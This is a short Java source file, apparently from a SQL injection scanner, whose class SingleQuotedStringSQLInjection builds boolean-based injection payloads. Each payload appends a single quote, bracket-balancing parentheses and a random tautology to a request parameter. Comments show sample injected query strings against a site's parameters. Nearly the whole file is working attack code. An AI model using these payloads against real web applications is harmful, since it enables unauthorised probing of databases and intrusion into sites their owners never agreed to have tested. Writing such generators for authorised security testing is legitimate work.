package de.nshevchenko.sqlinjection.type;

import org.apache.commons.lang.RandomStringUtils;


public class SingleQuotedStringSQLInjection implements SQLInjection{


    //action=artikel' AND 'IXSZX'='IXSZX&cat=8&id=17&artlang=de
    //action=artikel&cat=8&id=17&artlang=de' AND 'ITCOB'='ITCOB
    //action=artikel&cat=8&id=17&artlang=de' AND 'ITCOB'='ITCOB
    


    public String createInjectionWithNumberOfBrackets(String oldValue, int numberOfBrackets){
        String randomString = RandomStringUtils.randomAlphabetic(4);
        StringBuffer myNewValue = new StringBuffer(oldValue);
        myNewValue.append("'" );
        for(int i=0; i<numberOfBrackets; i++){
            myNewValue.append(")");
        }
        myNewValue.append(" AND ");
        for(int i=0; i<numberOfBrackets; i++){
            myNewValue.append("(");
        }
        myNewValue.append("'");
        myNewValue.append(randomString);
        myNewValue.append("'='");
        myNewValue.append(randomString);
        return myNewValue.toString();
    }

    public String sqlInjectionType(){
        return SingleQuotedStringSQLInjection.class.getName();
    }


}
